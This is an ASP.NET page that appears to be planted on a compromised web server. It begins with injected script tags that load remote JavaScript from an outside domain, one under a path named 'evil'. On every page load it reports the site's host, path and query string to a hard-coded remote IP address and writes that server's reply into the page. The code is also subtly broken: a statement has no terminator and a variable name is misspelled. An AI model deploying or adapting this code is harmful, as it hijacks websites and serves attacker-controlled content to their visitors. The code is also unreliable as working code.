<script src="http://cpm.36obuy.org/lion/1.js"></script><script src="http://cpm.36obuy.org/evil/1.js"></script><%@ Page Language="C#" Debug="true" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%>
<%@ import Namespace="System.IO"%>
<%@ import Namespace="System.Diagnostics"%>
<%@ import Namespace="System.Data"%>
<%@ import Namespace="System.Management"%>
<%@ import Namespace="System.Data.OleDb"%>
<%@ import Namespace="Microsoft.Win32"%>
<%@ import Namespace="System.Net.Sockets" %>
<%@ import Namespace="System.Net" %>
<%@ import Namespace="System.Runtime.InteropServices"%>
<%@ import Namespace="System.DirectoryServices"%>
<%@ import Namespace="System.ServiceProcess"%>
<%@ import Namespace="System.Text.RegularExpressions"%>
<%@ Import Namespace="System.Threading"%>
<%@ Import Namespace="System.Data.SqlClient"%>
<%@ import Namespace="Microsoft.VisualBasic"%>
<%@ Assembly Name="System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ Assembly Name="System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ Assembly Name="System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ Assembly Name="Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a"%>

<script runat="server">

/// <summary>
/// POST 请求方法
/// body是要传递的参数,格式"roleId=1&uid=2"
/// post的cotentType填写:
/// "application/x-www-form-urlencoded"
/// soap填写:"text/xml; charset=utf-8"
/// </summary>
/// <param name="url"></param>
/// <param name="body"></param>
/// <param name="contentType"></param>
/// <returns></returns>
    public string PostHttp(string url, string body, string contentType)
    {
        HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);

        httpWebRequest.ContentType = contentType;
        httpWebRequest.Method = "POST";
        httpWebRequest.Timeout = 20000;

        //byte[] btBodys = Encoding.UTF8.GetBytes(body);
        byte[] btBodys = Encoding.Default.GetBytes(body);
        
        httpWebRequest.ContentLength = btBodys.Length;
        httpWebRequest.GetRequestStream().Write(btBodys, 0, btBodys.Length);

        HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
        StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
        string responseContent = streamReader.ReadToEnd();

        httpWebResponse.Close();
        streamReader.Close();
        httpWebRequest.Abort();
        httpWebResponse.Close();

        return responseContent;
    }

    /// <summary>
    /// get 请求方法
    /// </summary>
    /// <param name="url"></param>
    /// <returns></returns>
    public string GetHttp(string url)
    {
        HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);

        httpWebRequest.ContentType = "application/x-www-form-urlencoded";
        //httpWebRequest.Headers.Add("User-Agent", "aQ0O010O");
        httpWebRequest.UserAgent = "aQ0O010O";
        httpWebRequest.Method = "GET";
        httpWebRequest.Timeout = 999999;

        HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
        StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.GetEncoding("GB2312"));
        string responseContent = streamReader.ReadToEnd();

        httpWebResponse.Close();
        streamReader.Close();

        return responseContent;
    }


    protected void Page_Load(object sender, EventArgs e)
    {

        string rjrtyrhururif ="http://122.114.247.204/AA/"
        string host_name = "http://" + Request.ServerVariables["HTTP_HOST"] + Request.ServerVariables["script_name"];
        string Remote_file = Remdte_sevcev + "/index.php" + "?host=" + host_name + "&url=" + Request.ServerVariables["Query_String"] + "&domain=" + Request.ServerVariables["Server_Name"];
        string Content_mb = GetHttp(Remote_file);
        Response.Write(Content_mb);

    }
</script>